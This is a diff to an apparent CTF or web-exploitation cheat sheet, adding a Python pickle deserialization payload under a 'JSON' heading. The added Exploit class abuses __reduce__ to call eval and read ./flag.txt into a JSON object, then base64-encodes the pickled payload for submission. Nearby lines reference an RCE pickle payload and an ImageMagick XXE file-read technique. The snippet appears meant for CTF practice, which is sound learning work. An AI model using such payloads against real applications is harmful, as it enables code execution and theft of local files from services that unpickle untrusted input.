@@ -101,6 +101,19 @@ class RCE(object):
 p = base64.b64encode(pickle.dumps(RCE())).decode()
 ```
 
+- **JSON**
+```python
+class Exploit:
+    def __reduce__(self):
+        return (eval, ('{"name":"name","userid":"1234","password":open("./flag.txt").read()}',))
+
+
+payload = pickle.dumps(Exploit())
+b64_payload = base64.b64encode(payload).decode('ascii')
+print(b64_payload)
+```
+
+
 ### Imagemagick
 
 - File upload read local file (xxe)
